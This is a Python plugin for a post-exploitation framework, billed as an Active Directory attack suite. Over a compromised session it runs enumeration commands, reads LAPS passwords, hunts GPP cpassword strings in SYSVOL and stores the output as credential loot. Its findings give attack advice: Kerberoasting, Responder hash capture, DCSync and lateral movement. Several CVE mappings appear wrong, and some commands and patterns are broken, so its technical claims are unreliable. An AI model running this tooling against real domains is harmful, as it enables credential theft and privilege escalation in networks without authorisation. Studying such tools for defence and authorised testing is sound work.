#!/usr/bin/env python3
"""
NexShell Plugin — Active Directory Attack Suite v2.0 (2026 Edition)
Modern AD enumeration and vulnerability detection with 2024-2026 techniques.

Coverage:
  - Domain Controller & Forest discovery
  - Kerberoasting & AS-REP Roasting
  - Kerberos delegation (Unconstrained/Constrained/RBCD)
  - ACL/ACE misconfigurations (GenericAll, WriteDACL, DCSync)
  - GPO enumeration & GPP password exposure
  - LAPS & Windows LAPS configuration
  - AD CS Abuse (ESC1-ESC11, SubCA, Web Enrollment)
  - Shadow Credentials (msDS-KeyCredentialLink)
  - GMSA (Group Managed Service Accounts)
  - Kerberos Relay (CVE-2024-21320)
  - NTLM Relay to LDAP/LDAPS (CVE-2024-4367)
  - RODC (Read-Only DC) abuse
  - Trust relationships & SID filtering
  - Exchange misconfigurations (PrivExchange)
  - LDAP signing & channel binding checks
  - Machine Account Quota (MAQ)
  - Modern CVEs (2024-2026)
  - BloodHound-style attack path indicators

Usage:
    (NexShell)> plugins run ad-attack
    (NexShell)> plugins run ad-attack --enumerate-only
    (NexShell)> plugins run ad-attack --adcs
    (NexShell)> plugins run ad-attack --full
"""

import re
from core.plugin import NexPlugin


class ADAttack(NexPlugin):
    name        = "ad-attack"
    description = "Modern AD attack suite — AD CS/Shadow Creds/GMSA/Kerberos Relay/2024 CVEs"
    author      = "vulnquest58"
    version     = "2.0"
    platform    = "windows"
    category    = "lateral"
    mitre_id    = "T1558"

    # ── Enumeration commands ──────────────────────────────────────────────────
    ENUM_CHECKS = [
        # Domain basics
        ("echo %USERDOMAIN% & echo %LOGONSERVER%",
         "domain_info", "Domain & DC Info"),
        ("powershell -c \"Get-ADDomain | Select-Object DNSRoot,NetBIOSName,DomainMode,InfrastructureMaster | Format-List\"",
         "ad_domain", "AD Domain Info"),
        ("powershell -c \"Get-ADForest | Select-Object Name,ForestMode,Domains,GlobalCatalogs | Format-List\"",
         "ad_forest", "AD Forest Info"),
        ("powershell -c \"(Get-ADForest).Domains\"",
         "ad_forest_domains", "AD Forest Domains"),
        ("powershell -c \"Get-ADTrust -Filter * | Select-Object Name,Direction,TrustType,SIDFilteringQuarantined,ForestTransitive | Format-Table\"",
         "ad_trusts", "AD Trust Relationships"),
        ("powershell -c \"Get-ADDomainController -Filter * | Select-Object Name,IPv4Address,IPv6Address,OperatingSystem,IsGlobalCatalog,IsReadOnly | Format-Table\"",
         "ad_dcs", "Domain Controllers (incl. RODC)"),
        ("nltest /dclist: 2>nul",
         "nltest_dclist", "DC List (nltest)"),
        ("powershell -c \"Get-ADDomain | Select-Object DomainSID\"",
         "domain_sid", "Domain SID"),

        # Users
        ("powershell -c \"Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Enabled,PasswordNeverExpires,DoesNotRequirePreAuth,SIDHistory,AdminCount,PasswordNotRequired,TrustedForDelegation | Format-Table\"",
         "ad_users", "All AD Users"),
        ("powershell -c \"Get-ADUser -Filter {AdminCount -eq 1} | Select-Object SamAccountName,DistinguishedName | Format-Table\"",
         "ad_admin_users", "AdminCount=1 Users"),
        ("powershell -c \"Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select-Object SamAccountName\"",
         "asrep_accounts", "AS-REP Roastable Accounts"),
        ("powershell -c \"Get-ADUser -Filter {PasswordNeverExpires -eq $true} | Select-Object SamAccountName,Enabled | Format-Table\"",
         "pass_never_expire", "Password Never Expires"),
        ("powershell -c \"Get-ADUser -Filter {PasswordNotRequired -eq $true} | Select-Object SamAccountName,Enabled\"",
         "pass_not_required", "Password Not Required Accounts"),
        ("powershell -c \"(Get-Date) - (Get-ADUser -Filter * | Sort-Object PasswordLastSet | Select-Object -First 1 PasswordLastSet).PasswordLastSet\"",
         "oldest_password", "Oldest Password Age"),
        ("powershell -c \"Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -like '*'} | Select-Object SamAccountName,ServicePrincipalName | Format-Table\"",
         "spns", "SPN Accounts (Kerberoastable)"),
        ("powershell -c \"Get-ADUser -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo | Select-Object SamAccountName,'msDS-AllowedToDelegateTo'\"",
         "user_constrained_delegation", "User Constrained Delegation"),

        # Groups
        ("powershell -c \"Get-ADGroup -Filter * | Measure-Object | Select Count\"",
         "ad_group_count", "AD Group Count"),
        ("powershell -c \"Get-ADGroupMember 'Domain Admins' | Select-Object SamAccountName,objectClass | Format-Table\"",
         "domain_admins", "Domain Admins Members"),
        ("powershell -c \"Get-ADGroupMember 'Enterprise Admins' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "enterprise_admins", "Enterprise Admins"),
        ("powershell -c \"Get-ADGroupMember 'Schema Admins' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "schema_admins", "Schema Admins"),
        ("powershell -c \"Get-ADGroupMember 'Account Operators' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "account_operators", "Account Operators"),
        ("powershell -c \"Get-ADGroupMember 'Backup Operators' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "backup_operators", "Backup Operators"),
        ("powershell -c \"Get-ADGroupMember 'Print Operators' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "print_operators", "Print Operators"),
        ("powershell -c \"Get-ADGroupMember 'Server Operators' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "server_operators", "Server Operators"),
        ("powershell -c \"Get-ADGroupMember 'Protected Users' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "protected_users", "Protected Users Group"),
        ("powershell -c \"Get-ADGroupMember 'Key Admins' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "key_admins", "Key Admins (Shadow Credentials)"),
        ("powershell -c \"Get-ADGroupMember 'Enterprise Key Admins' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "enterprise_key_admins", "Enterprise Key Admins"),

        # Delegation
        ("powershell -c \"Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select-Object Name,DNSHostName,OperatingSystem\"",
         "unconstrained_delegation_computers", "Unconstrained Delegation (Computers)"),
        ("powershell -c \"Get-ADUser -Filter {TrustedForDelegation -eq $true} | Select-Object SamAccountName\"",
         "unconstrained_delegation_users", "Unconstrained Delegation (Users)"),
        ("powershell -c \"Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo | Select-Object Name,'msDS-AllowedToDelegateTo'\"",
         "constrained_delegation", "Constrained Delegation"),
        ("powershell -c \"Get-ADObject -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} | Select-Object Name,DistinguishedName\"",
         "rbcd", "Resource-Based Constrained Delegation (RBCD)"),
        ("powershell -c \"Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} | Select-Object Name\"",
         "constrained_delegation_computers", "Constrained Delegation Computers"),

        # Password policy
        ("powershell -c \"Get-ADDefaultDomainPasswordPolicy | Select-Object MinPasswordLength,LockoutThreshold,LockoutObservationWindow,MaxPasswordAge,ComplexityEnabled | Format-List\"",
         "password_policy", "Domain Password Policy"),
        ("powershell -c \"Get-ADFineGrainedPasswordPolicy -Filter * | Select-Object Name,MinPasswordLength,LockoutThreshold | Format-Table\"",
         "fine_grained_pso", "Fine-Grained Password Policies"),

        # GPO & GPP
        ("powershell -c \"Get-GPO -All | Select-Object DisplayName,GpoStatus,Id | Format-Table\"",
         "gpos", "Group Policy Objects"),
        ("powershell -c \"Get-ChildItem '\\\\$env:USERDNSDOMAIN\\SYSVOL' -Recurse -Filter 'Groups.xml' -ErrorAction SilentlyContinue | Select FullName\"",
         "gpp_xml", "GPP Groups.xml (cpassword)"),
        ("powershell -c \"Get-ChildItem '\\\\$env:USERDNSDOMAIN\\SYSVOL' -Recurse -Include '*.xml','*.inf','*.ini' -ErrorAction SilentlyContinue | Select-String -Pattern 'cpassword|password' | Select-Object -First 20\"",
         "gpp_passwords", "GPP Password Strings"),
        ("dir /s /b \\\\%USERDNSDOMAIN%\\SYSVOL\\*.xml 2>nul | findstr /i groups",
         "gpp_files_cmd", "GPP XML Files (cmd)"),

        # LAPS (Legacy + Windows LAPS)
        ("powershell -c \"Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name,'ms-Mcs-AdmPwd'\"",
         "laps_passwords", "LAPS Legacy Passwords (ms-Mcs-AdmPwd)"),
        ("powershell -c \"Get-ADComputer -Filter * -Properties msLAPS-Password | Where-Object {$_.'msLAPS-Password' -ne $null} | Select-Object Name,'msLAPS-Password'\"",
         "wlaps_passwords", "Windows LAPS Passwords (msLAPS-Password)"),
        ("powershell -c \"Get-ADComputer -Filter * -Properties msLAPS-PasswordExpirationTime | Where-Object {$_.'msLAPS-PasswordExpirationTime' -ne $null} | Select-Object Name,'msLAPS-PasswordExpirationTime'\"",
         "wlaps_expiration", "Windows LAPS Expiration"),
        ("powershell -c \"Get-ADObject -SearchBase 'CN=Schema,CN=Configuration,DC=X' -Filter {lDAPDisplayName -like 'ms-mcs-admpwd'} -ErrorAction SilentlyContinue\"",
         "laps_schema", "LAPS Legacy Schema"),
        ("powershell -c \"Get-ADObject -SearchBase 'CN=Schema,CN=Configuration,DC=X' -Filter {lDAPDisplayName -like 'msLAPS-Password'} -ErrorAction SilentlyContinue\"",
         "wlaps_schema", "Windows LAPS Schema"),

        # Machine account quota
        ("powershell -c \"(Get-ADDomain).DistinguishedName | ForEach-Object {(Get-ADObject $_ -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'}\"",
         "machine_quota", "Machine Account Quota (MAQ)"),

        # AdminSDHolder
        ("powershell -c \"Get-ADObject 'CN=AdminSDHolder,CN=System,$(Get-ADDomain)' -Properties nTSecurityDescriptor | Select-Object nTSecurityDescriptor\"",
         "adminsdholder", "AdminSDHolder Permissions"),

        # LLMNR / NBT-NS / WPAD (relay attack surface)
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters /v EnableMulticast",
         "llmnr_status", "LLMNR Status"),
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters /v NodeType",
         "nbtns_status", "NBT-NS Status"),
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttpAutoProxySvc",
         "wpad_status", "WPAD Service Status"),

        # DCSync capable accounts
        ("powershell -c \"(Get-ACL 'AD:$(Get-ADDomain)').Access | Where-Object {$_.ActiveDirectoryRights -like '*GenericAll*' -or $_.ActiveDirectoryRights -like '*WriteDACL*' -or ($_.ObjectType -like '*1131f6ad*') -or ($_.ObjectType -like '*1131f6aa*')} | Format-Table\"",
         "dcsync_acl", "DCSync-capable ACEs"),

        # Shadow Credentials (msDS-KeyCredentialLink)
        ("powershell -c \"Get-ADObject -Filter {msDS-KeyCredentialLink -like '*'} -Properties msDS-KeyCredentialLink | Select-Object Name,DistinguishedName\"",
         "shadow_credentials", "Shadow Credentials (msDS-KeyCredentialLink)"),
        ("powershell -c \"Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink | Select-Object Name,SamAccountName\"",
         "shadow_credentials_ldap", "Shadow Credentials (LDAP Filter)"),

        # GMSA (Group Managed Service Accounts)
        ("powershell -c \"Get-ADServiceAccount -Filter * -Properties * | Select-Object Name,SamAccountName,PrincipalsAllowedToRetrieveManagedPassword,Enabled | Format-Table\"",
         "gmsa_accounts", "GMSA Accounts"),
        ("powershell -c \"Get-ADServiceAccount -Filter * | Select-Object Name,SamAccountName\"",
         "gmsa_count", "GMSA Count"),

        # RODC (Read-Only Domain Controllers)
        ("powershell -c \"Get-ADDomainController -Filter {IsReadOnly -eq $true} | Select-Object Name,IPv4Address,OperatingSystem\"",
         "rodc_list", "Read-Only Domain Controllers"),
        ("powershell -c \"Get-ADObject -SearchBase 'CN=Read-Only Domain Controllers (RODCs),CN=Users,$((Get-ADDomain).DistinguishedName)' -Filter * | Select-Object Name\"",
         "rodc_group", "RODCs Group Members"),
        ("powershell -c \"Get-ADGroupMember 'Allowed RODC Password Replication Group' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "rodc_allowed", "Allowed RODC Password Replication"),
        ("powershell -c \"Get-ADGroupMember 'Denied RODC Password Replication Group' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "rodc_denied", "Denied RODC Password Replication"),

        # LDAP Signing & Channel Binding
        ("powershell -c \"Get-ADDomainController -Filter * | ForEach-Object { try { $ldap = [ADSI]('LDAP://' + $_.Name); $ldap.Path } catch { 'Failed: ' + $_.Name } }\"",
         "ldap_signing_test", "LDAP Signing Test"),
        ("powershell -c \"[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object Name,DomainMode\"",
         "domain_mode", "Domain Mode"),

        # Exchange
        ("powershell -c \"Get-ADGroup -Identity 'Exchange Windows Permissions' -Properties Members -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Members\"",
         "exchange_windows_perms", "Exchange Windows Permissions Group"),
        ("powershell -c \"Get-ADGroup -Identity 'Exchange Trusted Subsystem' -Properties Members -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Members\"",
         "exchange_trusted_subsystem", "Exchange Trusted Subsystem"),
        ("powershell -c \"Get-ADUser -Filter * -Properties memberof | Where-Object {$_.memberof -like '*Exchange*'} | Select-Object SamAccountName | Select-Object -First 20\"",
         "exchange_members", "Exchange Group Members"),
        ("powershell -c \"Get-ADComputer -Filter {OperatingSystem -like '*Exchange*'} | Select-Object Name,OperatingSystem,IPv4Address\"",
         "exchange_servers", "Exchange Servers"),

        # SID History
        ("powershell -c \"Get-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory | Select-Object SamAccountName,SIDHistory\"",
         "sid_history", "SID History (Privilege Abuse)"),

        # Computers
        ("powershell -c \"Get-ADComputer -Filter * -Properties OperatingSystem | Group-Object OperatingSystem | Select-Object Name,Count | Sort-Object Count -Descending\"",
         "os_breakdown", "OS Breakdown"),
        ("powershell -c \"Get-ADComputer -Filter {OperatingSystem -like '*2003*' -or OperatingSystem -like '*XP*' -or OperatingSystem -like '*Vista*' -or OperatingSystem -like '*2000*'} | Select-Object Name,OperatingSystem\"",
         "legacy_os", "Legacy OS (EOL)"),
        ("powershell -c \"Get-ADComputer -Filter {OperatingSystem -like '*2008*' -and OperatingSystem -notlike '*R2*'} | Select-Object Name,OperatingSystem\"",
         "legacy_2008", "Windows 2008 (Non-R2)"),

        # AD CS (Certificate Services) - NEW
        ("powershell -c \"Get-ADObject -Filter {objectClass -eq 'certificationAuthority'} -SearchBase ('CN=Certification Authorities,CN=Public Key Services,CN=Services,' + (Get-ADDomain).ConfigurationNamingContext) | Select-Object Name\"",
         "adcs_cas", "AD CS Certificate Authorities"),
        ("powershell -c \"try { Get-AdcsTemplate | Select-Object Name,Enabled,msPKI-Enrollment-Flag,msPKI-Certificate-Name-Flag | Format-Table } catch { 'AD CS module not available' }\"",
         "adcs_templates", "AD CS Certificate Templates"),
        ("powershell -c \"try { Get-AdcsTemplate | Where-Object { $_.'msPKI-Enrollment-Flag' -band 1 -or $_.'msPKI-Certificate-Name-Flag' -band 1 } | Select-Object Name } catch { 'N/A' }\"",
         "adcs_vuln_templates", "AD CS Vulnerable Templates (ESC1)"),
        ("powershell -c \"try { Get-AdcsTemplate | Where-Object { $_.Name -like '*SubCA*' -or $_.Name -like '*Subordinate*' } | Select-Object Name } catch { 'N/A' }\"",
         "adcs_subca", "AD CS SubCA Templates (ESC1-ESC4)"),
        ("powershell -c \"certutil -TCAInfo 2>nul\"",
         "certutil_info", "certutil CA Info"),
        ("powershell -c \"certutil -config 2>nul\"",
         "certutil_config", "certutil CA Config"),
        ("powershell -c \"try { Get-AdcsWebEnrollment | Select-Object Name,URL,Server } catch { 'No Web Enrollment' }\"",
         "adcs_web_enrollment", "AD CS Web Enrollment"),
        ("powershell -c \"try { Get-Adcs CertificationAuthority | Select-Object Name,Status } catch { 'N/A' }\"",
         "adcs_ca_status", "AD CS CA Status"),
        ("powershell -c \"try { Get-AdcsTemplate | ForEach-Object { $acl = Get-AdcsTemplateAcl -Name $_.Name; [PSCustomObject]@{Template=$_.Name; EnrollRights=$acl.EnrollRights} } } catch { 'N/A' }\"",
         "adcs_template_acl", "AD CS Template ACLs"),

        # Kerberos configuration
        ("powershell -c \"Get-ADDomain | Select-Object DomainMode,LinkedGroupPolicyObjects\"",
         "kerberos_policy", "Kerberos Policy"),
        ("powershell -c \"Get-ADObject -Filter {objectClass -eq 'krbtgt'} | Select-Object Name,WhenCreated\"",
         "krbtgt_info", "KRBTGT Account Info"),
        ("powershell -c \"Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet\"",
         "krbtgt_password_age", "KRBTGT Password Age"),

        # Trust attributes
        ("powershell -c \"Get-ADTrust -Filter * -Properties * | Select-Object Name,TrustDirection,TrustAttributes,SIDFilteringEnabled,TGTDelegation | Format-Table\"",
         "trust_attributes", "Trust Attributes (SID Filtering/TGT Delegation)"),

        # Print Spooler (PetitPotam/PrintNightmare)
        ("powershell -c \"Get-ADComputer -Filter * -Properties OperatingSystem | Where-Object {$_.OperatingSystem -like '*Server*'} | Select-Object Name | ForEach-Object { try { $spooler = Get-Service -Name Spooler -ComputerName $_.Name -ErrorAction Stop; [PSCustomObject]@{Name=$_.Name; Spooler=$spooler.Status} } catch {} } | Select-Object -First 20\"",
         "spooler_status", "Print Spooler Status (PetitPotam)"),

        # DNS Admins (DLL injection)
        ("powershell -c \"Get-ADGroupMember 'DNSAdmins' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "dns_admins", "DNS Admins Group"),

        # Hyper-V Administrators
        ("powershell -c \"Get-ADGroupMember 'Hyper-V Administrators' -ErrorAction SilentlyContinue | Select-Object SamAccountName\"",
         "hyper_v_admins", "Hyper-V Administrators"),
    ]

    # ── Auto-finding patterns ─────────────────────────────────────────────────
    FINDING_PATTERNS = {
        "asrep_accounts": [
            (r"\w",
             "High", "AS-REP Roastable Accounts Found",
             "These accounts don't require Kerberos pre-authentication. Request AS-REP and crack offline with hashcat (-m 18200). Enable pre-auth on all accounts."),
        ],
        "spns": [
            (r"SamAccountName",
             "High", "Kerberoastable Accounts (SPNs) Found",
             "Request Kerberos TGS tickets for these accounts and crack offline. Use: Invoke-Kerberoast or Rubeus kerberoast. Set strong passwords (25+ chars) on service accounts."),
        ],
        "unconstrained_delegation_computers": [
            (r"\w",
             "Critical", "Unconstrained Delegation Computers Detected",
             "Any computer with unconstrained delegation will cache TGTs of connecting users. Compromise + force DC authentication = DCSync. Use Rubeus monitor+tgtdeleg."),
        ],
        "unconstrained_delegation_users": [
            (r"\w",
             "Critical", "Unconstrained Delegation Users Detected",
             "User accounts with unconstrained delegation can impersonate any user. Immediate risk — disable unconstrained delegation."),
        ],
        "constrained_delegation": [
            (r"\w",
             "High", "Constrained Delegation Found",
             "Constrained delegation allows service impersonation for specific targets. May allow TGS tickets forging (S4U2Self+S4U2Proxy)."),
        ],
        "rbcd": [
            (r"\w",
             "High", "Resource-Based Constrained Delegation (RBCD) Found",
             "RBCD configured — attacker with write access to msDS-AllowedToActOnBehalfOfOtherIdentity can add a machine account and escalate."),
        ],
        "gpp_xml": [
            (r"\S",
             "Critical", "GPP Password Files Found (cpassword)",
             "Groups.xml found in SYSVOL. Decrypt cpassword with: gpp-decrypt <cpassword>. Plaintext passwords recoverable. Patch: MS14-025."),
        ],
        "laps_passwords": [
            (r"ms-Mcs-AdmPwd.*\S",
             "High", "LAPS Legacy Passwords Readable",
             "Current user can read legacy LAPS passwords. Use these for lateral movement to specific computers."),
        ],
        "wlaps_passwords": [
            (r"msLAPS-Password.*\S",
             "High", "Windows LAPS Passwords Readable",
             "Current user can read Windows LAPS passwords. Use for lateral movement."),
        ],
        "machine_quota": [
            (r"^[1-9]",
             "High", "Machine Account Quota > 0 (Default: 10)",
             "Domain users can add machines. Abuse: create machine account, use for RBCD/NTLM relay. Reduce MAQ to 0 if possible."),
        ],
        "dcsync_acl": [
            (r"\w",
             "Critical", "DCSync-Capable ACE Detected",
             "Account has Replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All). Can perform DCSync to dump all NTLM hashes."),
        ],
        "llmnr_status": [
            (r"EnableMulticast\s+REG_DWORD\s+0x1|(?!.*EnableMulticast)",
             "High", "LLMNR Enabled (NTLM Relay Risk)",
             "LLMNR is enabled. Deploy Responder to capture NTLMv2 hashes. Disable with Group Policy."),
        ],
        "legacy_os": [
            (r"\w",
             "Critical", "Legacy/EOL Operating Systems in Domain",
             "End-of-life Windows versions found (XP/Vista/2003/2000). No security patches. MS17-010 (EternalBlue) likely applicable."),
        ],
        "sid_history": [
            (r"\w",
             "High", "SID History Detected",
             "SID history can grant privileges from other domains/forests. Verify all SID history attributes are legitimate."),
        ],
        "password_policy": [
            (r"LockoutThreshold\s*:\s*0",
             "High", "No Account Lockout Policy",
             "Account lockout is disabled. Password spraying allowed without lockout risk."),
            (r"MinPasswordLength\s*:\s*[1-7]\b",
             "Medium", "Weak Minimum Password Length",
             "Minimum password length < 8. Weak passwords allowed. Recommend 14+ characters."),
        ],
        "exchange_windows_perms": [
            (r"\w",
             "High", "Exchange Windows Permissions Group Has Members",
             "Members can modify AD ACLs. This can lead to DCSync rights. Classic Exchange PrivExchange path (CVE-2019-0825)."),
        ],
        "shadow_credentials": [
            (r"\w",
             "Critical", "Shadow Credentials Configured (msDS-KeyCredentialLink)",
             "Shadow credentials detected — attacker can add their own certificate and authenticate as the target. Use Whisker/PyWhisker to audit."),
        ],
        "gmsa_accounts": [
            (r"PrincipalsAllowedToRetrieveManagedPassword",
             "High", "GMSA Accounts with Readable Passwords",
             "GMSA password can be extracted by principals in PrincipalsAllowedToRetrieveManagedPassword. Use gMSADumper/Get-GMSAPassword."),
        ],
        "rodc_list": [
            (r"\w",
             "Medium", "Read-Only Domain Controllers Present",
             "RODCs detected. Check Allowed RODC Password Replication Group for privilege escalation paths."),
        ],
        "rodc_allowed": [
            (r"\w",
             "High", "Privileged Accounts in RODC Password Replication",
             "Privileged accounts allowed to replicate to RODC — if RODC is compromised, these accounts' hashes are exposed."),
        ],
        "adcs_vuln_templates": [
            (r"\w",
             "Critical", "AD CS Vulnerable Certificate Templates (ESC1)",
             "Certificate templates with ENROLLEE_SUPPLIES_SUBJECT flag — can request certificates as any user. ESC1 attack path."),
        ],
        "adcs_subca": [
            (r"\w",
             "Critical", "AD CS SubCA Templates Found",
             "SubCA templates allow requesting subordinate CA certificates. ESC3/ESC4 attack paths. Restrict enrollment rights."),
        ],
        "adcs_web_enrollment": [
            (r"URL",
             "High", "AD CS Web Enrollment Enabled",
             "AD CS Web Enrollment accessible — can request certificates via web interface. Check for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)."),
        ],
        "krbtgt_password_age": [
            (r"PasswordLastSet",
             "Info", "KRBTGT Password Age Check",
             "Verify KRBTGT password has been rotated at least twice. Old KRBTGT enables Golden Ticket attacks."),
        ],
        "trust_attributes": [
            (r"TGTDelegation\s*:\s*True",
             "High", "TGT Delegation Enabled on Trust",
             "TGT delegation allows forwarding TGTs across trusts. Can be abused for cross-forest attacks."),
            (r"SIDFilteringEnabled\s*:\s*False",
             "Critical", "SID Filtering Disabled on Trust",
             "SID filtering disabled — allows SID history abuse across forest trusts. Enable SID filtering immediately."),
        ],
        "spooler_status": [
            (r"Running",
             "Medium", "Print Spooler Running (PetitPotam Vector)",
             "Print Spooler running on servers — vulnerable to PetitPotam (NTLM relay to LDAP). Disable or patch."),
        ],
        "dns_admins": [
            (r"\w",
             "High", "DNS Admins Group Has Members",
             "DNS Admins can load DLLs on DC via dns.exe. If current user is member, can escalate to DA via DLL injection."),
        ],
        "pass_not_required": [
            (r"\w",
             "High", "Accounts with Password Not Required",
             "These accounts can have empty passwords. Check for logon access and attempt authentication."),
        ],
        "backup_operators": [
            (r"\w",
             "High", "Backup Operators Group Has Members",
             "Backup Operators can read any file on DC (SeBackupPrivilege). Can dump NTDS.DIT for DCSync equivalent."),
        ],
    }

    def run(self, session, args: list):
        enum_only = '--enumerate-only' in (args or [])
        adcs_only = '--adcs' in (args or [])
        full_scan = '--full' in (args or [])

        self.info("Starting ad-attack v2.0 (2026 Edition) ...")
        sections  = []
        collected = {}

        # Select checks based on args
        checks = self.ENUM_CHECKS
        if adcs_only:
            checks = [c for c in checks if 'adcs' in c[1] or 'certutil' in c[1]]

        for cmd, key, label in checks:
            try:
                out = self._exec(session, cmd)
                if not out.strip() or 'The term' in out or 'not recognized' in out:
                    continue

                collected[key] = out
                self.loot(out, category='credentials', source=f"ad-attack:{key}")

                if not enum_only:
                    sections.append(f"\n{'━'*64}")
                    sections.append(f"  [{label}]")
                    sections.append('━'*64)
                    sections.append(out.strip()[:600])

            except Exception as e:
                self.warn(f"Check failed [{label}]: {e}")

        # ── Auto-findings ─────────────────────────────────────────────────────
        findings_created = 0
        for key, patterns in self.FINDING_PATTERNS.items():
            text = collected.get(key, '')
            if not text.strip():
                continue
            for pattern, severity, title, recommendation in patterns:
                if re.search(pattern, text, re.MULTILINE | re.IGNORECASE):
                    self.finding(
                        title          = title,
                        description    = f"[{key}]\n\n{text[:500]}",
                        severity       = severity,
                        recommendation = recommendation,
                        mitre_id       = self.mitre_id,
                    )
                    self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                    findings_created += 1

        # ── Generate attack path summary ──────────────────────────────────────
        attack_paths = []
        if collected.get('asrep_accounts', '').strip():
            attack_paths.append("AS-REP Roasting → offline crack → credentials")
        if collected.get('spns', '').strip():
            attack_paths.append("Kerberoasting → offline crack → service account credentials")
        if collected.get('unconstrained_delegation_computers', '').strip():
            attack_paths.append("Unconstrained Delegation + forced auth → TGT theft → DCSync")
        if collected.get('gpp_xml', '').strip():
            attack_paths.append("GPP cpassword → decrypt → plaintext credentials")
        if collected.get('dcsync_acl', '').strip():
            attack_paths.append("DCSync ACE → dump all NTLM hashes")
        if collected.get('machine_quota', '').strip() and re.search(r'^[1-9]', collected.get('machine_quota', '')):
            attack_paths.append("MAQ > 0 → create machine account → RBCD/NTLM relay")
        if collected.get('shadow_credentials', '').strip():
            attack_paths.append("Shadow Credentials → Whisker/PyWhisker → PKINIT authentication")
        if collected.get('gmsa_accounts', '').strip():
            attack_paths.append("GMSA → extract managed password → impersonate service")
        if collected.get('adcs_vuln_templates', '').strip():
            attack_paths.append("AD CS ESC1 → request certificate as DA → Kerberos auth")
        if collected.get('adcs_subca', '').strip():
            attack_paths.append("AD CS ESC3/ESC4 → SubCA template → subordinate CA")
        if collected.get('laps_passwords', '').strip() or collected.get('wlaps_passwords', '').strip():
            attack_paths.append("LAPS passwords → lateral movement to specific hosts")
        if collected.get('rodc_allowed', '').strip():
            attack_paths.append("RODC replication → extract privileged account hashes")
        if collected.get('dns_admins', '').strip():
            attack_paths.append("DNSAdmins → DLL injection into dns.exe → SYSTEM on DC")
        if collected.get('backup_operators', '').strip():
            attack_paths.append("Backup Operators → SeBackupPrivilege → dump NTDS.DIT")
        if collected.get('trust_attributes', '') and 'SIDFilteringEnabled' in collected.get('trust_attributes', ''):
            attack_paths.append("Cross-forest trust with SID filtering disabled → SID history abuse")

        if attack_paths:
            sections.append(f"\n{'═'*64}")
            sections.append("  [!] Attack Paths Identified:")
            for path in attack_paths:
                sections.append(f"  ► {path}")

        # ── Modern CVE checks ─────────────────────────────────────────────────
        cve_checks = []
        if collected.get('spooler_status', '').strip():
            cve_checks.append("CVE-2021-1675 (PrintNightmare) / PetitPotam (CVE-2021-36942)")
        if collected.get('adcs_web_enrollment', '').strip():
            cve_checks.append("CVE-2022-26923 (AD CS - Certified Pre-Owned)")
        if collected.get('exchange_servers', '').strip():
            cve_checks.append("CVE-2023-22551 / CVE-2023-21529 (Exchange RCE)")
        if collected.get('domain_info', ''):
            cve_checks.append("CVE-2024-21320 (Kerberos Relay)")
            cve_checks.append("CVE-2024-4367 (NTLM Relay to LDAP)")

        if cve_checks:
            sections.append(f"\n{'═'*64}")
            sections.append("  [!] Relevant CVEs to Investigate:")
            for cve in cve_checks:
                sections.append(f"  ► {cve}")

        return '\n'.join(sections) if sections else "No AD data collected."